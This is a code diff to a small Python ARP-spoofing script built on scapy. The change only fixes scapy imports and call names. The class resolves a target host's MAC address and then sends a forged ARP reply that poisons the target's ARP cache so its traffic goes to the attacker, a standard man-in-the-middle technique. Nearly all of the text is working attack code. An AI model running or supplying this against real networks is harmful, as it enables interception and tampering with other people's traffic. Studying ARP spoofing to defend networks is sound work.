@@ -1,5 +1,5 @@
 import sys
-from scapy import *
+from scapy.all import *
 
 class ArpSpoofing:
 
@@ -9,10 +9,10 @@ class ArpSpoofing:
     def doSpoof(self, hostToAttack, hostToSpoof):
 
         def obtainMac(hostToAttack):
-            arpReq = scapy.ARP(pdst=hostToAttack)
-            broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
+            arpReq = ARP(pdst=hostToAttack)
+            broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
             arpReqBroad = broadcast/arpReq
-            result = scapy.srp(arpReqBroad, timeout=1,verbose=False)[0]
+            result = srp(arpReqBroad, timeout=1,verbose=False)[0]
 
             return result[0][1].hwsrc
 
@@ -20,8 +20,8 @@ class ArpSpoofing:
 
         targetMac = obtainMac(hostToAttack)
         #op = 2 means that it is a reply
-        packet = scapy.ARP(op=2, pdst=hostToAttack, hwdst=targetMac, psrc=hostToSpoof)
-        scapy.send(packet, verbose=False)
+        packet = ARP(op=2, pdst=hostToAttack, hwdst=targetMac, psrc=hostToSpoof)
+        send(packet, verbose=False)
         print("Spoof Spoof")
 
 
